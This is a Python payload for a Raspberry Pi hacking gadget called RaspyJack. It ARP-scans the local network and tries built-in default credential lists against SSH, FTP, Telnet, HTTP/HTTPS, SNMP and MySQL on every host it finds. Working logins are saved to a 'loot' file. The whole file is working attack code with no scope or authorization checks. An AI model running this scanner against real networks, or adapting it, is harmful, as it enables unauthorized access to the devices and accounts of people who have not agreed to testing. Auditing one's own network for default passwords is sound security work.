#!/usr/bin/env python3
"""
RaspyJack Payload -- Default Credentials Scanner
=================================================
Author: 7h30th3r0n3

Auto-discovers hosts via ARP scan, then probes common services
(SSH, FTP, Telnet, HTTP, SNMP, MySQL) with built-in default creds.

Prerequisites: sshpass, scapy, requests

Controls:
  OK    -- Start scan       KEY1 -- Toggle view (progress/results)
  UP/DN -- Scroll results   KEY3 -- Exit

Loot: /root/Raspyjack/loot/DefaultCreds/creds_TIMESTAMP.json
"""

import os, sys, json, time, socket, ftplib, threading, subprocess, ipaddress
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
        "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/DefaultCreds"
RATE_LIMIT = 1.0
ROWS_VISIBLE = 7
CONN_TIMEOUT = 3

# ---------------------------------------------------------------------------
# Built-in credential lists per protocol
# ---------------------------------------------------------------------------
SSH_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("admin", "12345"), ("admin", "123456"), ("admin", "default"),
    ("admin", "changeme"), ("admin", "admin123"), ("admin", ""),
    ("root", "root"), ("root", "toor"), ("root", "password"),
    ("root", "1234"), ("root", "12345"), ("root", "123456"),
    ("root", ""), ("root", "changeme"), ("root", "letmein"),
    ("pi", "raspberry"), ("pi", "raspberrypi"), ("pi", "password"),
    ("ubnt", "ubnt"), ("ubuntu", "ubuntu"), ("user", "user"),
    ("support", "support"), ("cisco", "cisco"), ("vagrant", "vagrant"),
    ("test", "test"), ("oracle", "oracle"), ("guest", "guest"),
]
FTP_CREDS = [
    ("anonymous", ""), ("anonymous", "anonymous"), ("anonymous", "guest"),
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("admin", "12345"), ("admin", "123456"), ("admin", ""),
    ("admin", "changeme"), ("admin", "default"), ("admin", "ftp"),
    ("root", "root"), ("root", "toor"), ("root", "password"),
    ("root", "1234"), ("root", ""), ("ftp", "ftp"),
    ("ftpuser", "ftpuser"), ("ftpuser", "password"), ("ftpuser", "ftp"),
    ("user", "user"), ("user", "password"), ("test", "test"),
    ("guest", "guest"), ("backup", "backup"), ("upload", "upload"),
    ("web", "web"), ("www", "www"), ("data", "data"),
]
TELNET_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("admin", "12345"), ("admin", "123456"), ("admin", ""),
    ("admin", "default"), ("admin", "changeme"), ("admin", "admin123"),
    ("root", "root"), ("root", "toor"), ("root", "password"),
    ("root", "1234"), ("root", ""), ("root", "changeme"),
    ("user", "user"), ("user", "password"), ("guest", "guest"),
    ("cisco", "cisco"), ("enable", "enable"), ("support", "support"),
    ("operator", "operator"), ("monitor", "monitor"), ("manager", "manager"),
    ("tech", "tech"), ("service", "service"), ("debug", "debug"),
    ("ubnt", "ubnt"), ("pi", "raspberry"), ("test", "test"),
]
HTTP_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("admin", "12345"), ("admin", "123456"), ("admin", ""),
    ("admin", "changeme"), ("admin", "default"), ("admin", "admin123"),
    ("root", "root"), ("root", "password"), ("root", "1234"),
    ("root", ""), ("root", "toor"), ("user", "user"),
    ("user", "password"), ("guest", "guest"), ("operator", "operator"),
    ("manager", "manager"), ("supervisor", "supervisor"),
    ("admin", "pass"), ("admin", "letmein"), ("admin", "welcome"),
    ("admin", "admin1"), ("admin", "test"), ("web", "web"),
    ("monitor", "monitor"), ("support", "support"), ("cisco", "cisco"),
    ("ubnt", "ubnt"),
]
SNMP_COMMUNITIES = [
    "public", "private", "community", "snmp", "default",
    "read", "write", "monitor", "admin", "manager",
    "test", "cisco", "router", "switch", "network",
    "secret", "access", "system", "all", "ILMI",
    "cable-docsis", "internal", "private-access", "public-access",
    "mngt", "security", "C0de", "SNMP", "rmon", "1234",
]
MYSQL_CREDS = [
    ("root", ""), ("root", "root"), ("root", "password"),
    ("root", "mysql"), ("root", "1234"), ("root", "12345"),
    ("root", "123456"), ("root", "toor"), ("root", "admin"),
    ("root", "changeme"), ("root", "default"), ("root", "test"),
    ("admin", "admin"), ("admin", "password"), ("admin", ""),
    ("admin", "1234"), ("admin", "mysql"), ("mysql", "mysql"),
    ("mysql", "password"), ("mysql", ""), ("user", "user"),
    ("user", "password"), ("test", "test"), ("test", ""),
    ("dba", "dba"), ("db", "db"), ("dbadmin", "dbadmin"),
    ("guest", "guest"), ("backup", "backup"), ("monitor", "monitor"),
]

SERVICES = [
    (22,   "SSH",      SSH_CREDS),
    (21,   "FTP",      FTP_CREDS),
    (23,   "Telnet",   TELNET_CREDS),
    (80,   "HTTP",     HTTP_CREDS),
    (8080, "HTTP8080", HTTP_CREDS),
    (443,  "HTTPS",    HTTP_CREDS),
    (161,  "SNMP",     [(c, "") for c in SNMP_COMMUNITIES]),
    (3306, "MySQL",    MYSQL_CREDS),
]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = True
scanning = False
hosts = []
results = []          # {"host","port","service","user","pass","status"}
status_msg = "Press OK to start"
view_mode = "progress"
scroll_pos = 0
current_host_idx = 0
total_hosts = 0
current_service = ""
current_cred = ""
tests_done = 0

# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _detect_subnet():
    for iface in ("eth0", "wlan0", "usb0"):
        try:
            res = subprocess.run(["ip", "-4", "addr", "show", iface],
                                 capture_output=True, text=True, timeout=5)
            for line in res.stdout.splitlines():
                s = line.strip()
                if s.startswith("inet "):
                    return s.split()[1]
        except Exception:
            pass
    return None


def _arp_scan(cidr):
    try:
        from scapy.all import ARP, Ether, srp
    except ImportError:
        _set_status("scapy not installed!")
        return []
    try:
        net = ipaddress.IPv4Network(cidr, strict=False)
    except ValueError:
        return []
    _set_status(f"ARP scan {net}...")
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(net)),
                      timeout=3, verbose=False)
    except Exception:
        return []
    return sorted([r[ARP].psrc for _, r in ans],
                  key=lambda ip: ipaddress.IPv4Address(ip))


def _port_open(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(CONN_TIMEOUT)
        ok = s.connect_ex((host, port)) == 0
        s.close()
        return ok
    except Exception:
        return False


def _set_status(msg):
    with lock:
        global status_msg
        status_msg = msg

# ---------------------------------------------------------------------------
# Protocol testers
# ---------------------------------------------------------------------------

def _test_ssh(host, user, pw):
    try:
        res = subprocess.run(
            ["sshpass", "-p", pw, "ssh",
             "-o", "StrictHostKeyChecking=no",
             "-o", "UserKnownHostsFile=/dev/null",
             "-o", "ConnectTimeout=3",
             "-o", "BatchMode=no",
             f"{user}@{host}", "echo", "ok"],
            capture_output=True, text=True, timeout=8)
        return res.returncode == 0 and "ok" in res.stdout
    except Exception:
        return False


def _test_ftp(host, user, pw):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, 21, timeout=CONN_TIMEOUT)
        ftp.login(user, pw)
        ftp.quit()
        return True
    except Exception:
        return False


def _drain(sock):
    data = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except (socket.timeout, OSError):
        pass
    return data.decode("latin-1", errors="replace")


def _test_telnet(host, user, pw):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(CONN_TIMEOUT)
        s.connect((host, 23))
        time.sleep(0.5)
        _drain(s)
        s.sendall((user + "\r\n").encode())
        time.sleep(0.5)
        _drain(s)
        s.sendall((pw + "\r\n").encode())
        time.sleep(1.0)
        resp = _drain(s).lower()
        s.close()
        if any(k in resp for k in ["incorrect", "denied", "failed", "invalid"]):
            return False
        return any(k in resp for k in ["$", "#", ">", "welcome", "last login"])
    except Exception:
        return False


def _test_http(host, port, user, pw):
    try:
        import requests
    except ImportError:
        return False
    scheme = "https" if port == 443 else "http"
    try:
        r = requests.get(f"{scheme}://{host}:{port}/",
                         auth=(user, pw), timeout=CONN_TIMEOUT, verify=False)
        return r.status_code < 400
    except Exception:
        return False


def _test_snmp(host, community):
    try:
        from scapy.all import IP, UDP, SNMP, SNMPget, SNMPvarbind, ASN1_OID, sr1
    except ImportError:
        return False
    try:
        pkt = (IP(dst=host) / UDP(sport=40000, dport=161)
               / SNMP(community=community,
                      PDU=SNMPget(varbindlist=[
                          SNMPvarbind(oid=ASN1_OID("1.3.6.1.2.1.1.1.0"))])))
        reply = sr1(pkt, timeout=2, verbose=False)
        return reply and reply.haslayer(SNMP) and int(reply[SNMP].PDU.error) == 0
    except Exception:
        return False


def _test_mysql(host, user, pw):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(CONN_TIMEOUT)
        s.connect((host, 3306))
        g = s.recv(4096)
        s.close()
        if not g or len(g) < 4:
            return False
        cmd = ["mysql", f"-h{host}", f"-u{user}",
               f"-p{pw}" if pw else "--skip-password",
               "-e", "SELECT 1;"]
        return subprocess.run(cmd, capture_output=True, text=True,
                              timeout=8).returncode == 0
    except Exception:
        return False

# ---------------------------------------------------------------------------
# Dispatcher
# ---------------------------------------------------------------------------

def _test_cred(host, port, svc, user, pw):
    """Returns 'found', 'locked', or 'none'."""
    try:
        testers = {
            "SSH": lambda: _test_ssh(host, user, pw),
            "FTP": lambda: _test_ftp(host, user, pw),
            "Telnet": lambda: _test_telnet(host, user, pw),
            "SNMP": lambda: _test_snmp(host, user),
            "MySQL": lambda: _test_mysql(host, user, pw),
        }
        if svc in ("HTTP", "HTTP8080", "HTTPS"):
            return "found" if _test_http(host, port, user, pw) else "none"
        fn = testers.get(svc)
        return "found" if fn and fn() else "none"
    except Exception:
        return "locked"

# ---------------------------------------------------------------------------
# Scan thread
# ---------------------------------------------------------------------------

def _scan_all():
    global scanning, current_host_idx, total_hosts
    global current_service, current_cred, tests_done

    scanning = True
    cidr = _detect_subnet()
    if not cidr:
        _set_status("No network found!")
        scanning = False
        return

    discovered = _arp_scan(cidr)
    if not discovered:
        _set_status("No hosts found")
        scanning = False
        return

    with lock:
        hosts.clear()
        hosts.extend(discovered)
        total_hosts = len(discovered)
    _set_status(f"Found {total_hosts} host(s)")

    for h_idx, host in enumerate(discovered):
        if not running:
            break
        with lock:
            current_host_idx = h_idx + 1

        for port, svc, cred_list in SERVICES:
            if not running:
                break
            with lock:
                current_service = svc
            _set_status(f"{host} - {svc}")

            if not _port_open(host, port):
                continue

            for user, pw in cred_list:
                if not running:
                    break
                with lock:
                    current_cred = (f"community={user}" if svc == "SNMP"
                                    else f"{user}:{pw}")
                    tests_done += 1

                result = _test_cred(host, port, svc, user, pw)
                if result in ("found", "locked"):
                    entry = {
                        "host": host, "port": port, "service": svc,
                        "user": user, "pass": pw, "status": result,
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    }
                    with lock:
                        results.append(entry)
                    break  # next service
                time.sleep(RATE_LIMIT)

    _save_results()
    with lock:
        fc = sum(1 for r in results if r["status"] == "found")
    _set_status(f"Done! {fc} cred(s) found")
    scanning = False


def _save_results():
    os.makedirs(LOOT_DIR, exist_ok=True)
    with lock:
        copy = list(results)
    if not copy:
        return
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"creds_{ts}.json")
    report = {
        "scan_time": ts, "hosts_scanned": len(hosts),
        "credentials_found": [r for r in copy if r["status"] == "found"],
        "locked_out": [r for r in copy if r["status"] == "locked"],
    }
    try:
        with open(path, "w") as fh:
            json.dump(report, fh, indent=2)
        _set_status(f"Saved {os.path.basename(path)}")
    except Exception as e:
        _set_status(f"Save err: {e}")

# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _draw_progress():
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    d = ScaledDraw(img)
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "DEFAULT CREDS", font=font, fill="#00CCFF")
    d.ellipse((118, 3, 124, 9), fill="#00FF00" if scanning else "#444")

    with lock:
        msg, hi, ht = status_msg, current_host_idx, total_hosts
        svc, cred, done = current_service, current_cred, tests_done
        rl = list(results)

    if ht > 0:
        d.text((2, 16), f"Host {hi}/{ht}", font=font, fill="#AAA")
        d.rectangle((2, 28, 125, 35), outline="#444")
        fw = int((hi / ht) * 121)
        if fw > 0:
            d.rectangle((3, 29, 3 + fw, 34), fill="#00CCFF")
    else:
        d.text((2, 16), msg[:22], font=font, fill="#AAA")

    d.text((2, 40), f"Svc: {svc}", font=font, fill="#888")
    d.text((2, 52), f"Try: {cred[:20]}", font=font, fill="#CCC")
    d.text((2, 64), f"Tests: {done}", font=font, fill="#888")

    fc = sum(1 for r in rl if r["status"] == "found")
    lc = sum(1 for r in rl if r["status"] == "locked")
    d.text((2, 78), f"Found: {fc}", font=font, fill="#00FF00")
    d.text((2, 90), f"Locked: {lc}", font=font, fill="#FF4444")
    d.text((2, 104), msg[:22], font=font, fill="#FFAA00")

    d.rectangle((0, 116, 127, 127), fill="#111")
    foot = "Scanning... K3:Exit" if scanning else "OK:Start K1:View K3:Quit"
    d.text((2, 117), foot, font=font, fill="#888")
    LCD.LCD_ShowImage(img, 0, 0)


def _draw_results():
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    d = ScaledDraw(img)
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "DEFAULT CREDS", font=font, fill="#00CCFF")

    with lock:
        rl, sp = list(results), scroll_pos

    if not rl:
        d.text((2, 50), "No results yet", font=font, fill="#888")
    else:
        d.text((2, 16), f"Results: {len(rl)}", font=font, fill="#AAA")
        y = 28
        for e in rl[sp:sp + ROWS_VISIBLE]:
            color = {"found": "#00FF00", "locked": "#FF4444"}.get(
                e["status"], "#888")
            tag = e["service"][:4]
            if e["service"] == "SNMP":
                line = f"{e['host'][-6:]} {tag} {e['user'][:8]}"
            else:
                line = f"{e['host'][-6:]} {tag} {e['user'][:6]}:{e['pass'][:5]}"
            d.text((2, y), line[:22], font=font, fill=color)
            y += 12

    d.rectangle((0, 116, 127, 127), fill="#111")
    nav = f"{sp+1}-{min(sp+ROWS_VISIBLE, len(rl))}/{len(rl)}"
    d.text((2, 117), f"{nav} K1:Back K3:Quit", font=font, fill="#888")
    LCD.LCD_ShowImage(img, 0, 0)


def _draw_screen():
    (_draw_results if view_mode == "results" else _draw_progress)()

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global running, scanning, scroll_pos, view_mode

    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    d = ScaledDraw(img)
    d.text((4, 10), "DEFAULT CREDS", font=font, fill="#00CCFF")
    d.text((4, 26), "Scanner", font=font, fill="#00CCFF")
    d.text((4, 44), "ARP scan + probe", font=font, fill="#888")
    d.text((4, 56), "SSH FTP Telnet HTTP", font=font, fill="#888")
    d.text((4, 68), "SNMP MySQL", font=font, fill="#888")
    d.text((4, 86), "OK   Start scan", font=font, fill="#666")
    d.text((4, 98), "KEY1 Toggle view", font=font, fill="#666")
    d.text((4, 110), "KEY3 Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.5)

    scan_ref = None
    try:
        _draw_screen()
        while running:
            btn = get_button(PINS, GPIO)
            if btn == "KEY3":
                running = False
                break
            elif btn == "OK" and not scanning:
                scan_ref = threading.Thread(target=_scan_all, daemon=True)
                scan_ref.start()
                time.sleep(0.3)
            elif btn == "KEY1":
                with lock:
                    view_mode = ("results" if view_mode == "progress"
                                 else "progress")
                    scroll_pos = 0
                time.sleep(0.2)
            elif btn == "UP":
                with lock:
                    if scroll_pos > 0:
                        scroll_pos -= 1
                time.sleep(0.15)
            elif btn == "DOWN":
                with lock:
                    mx = max(0, len(results) - ROWS_VISIBLE)
                    if scroll_pos < mx:
                        scroll_pos += 1
                time.sleep(0.15)
            _draw_screen()
            time.sleep(0.1)
    finally:
        running = False
        scanning = False
        if scan_ref and scan_ref.is_alive():
            scan_ref.join(timeout=5)
        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            d = ScaledDraw(img)
            d.text((10, 56), "Scanner stopped", font=font, fill="RED")
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass
        GPIO.cleanup()


if __name__ == "__main__":
    main()
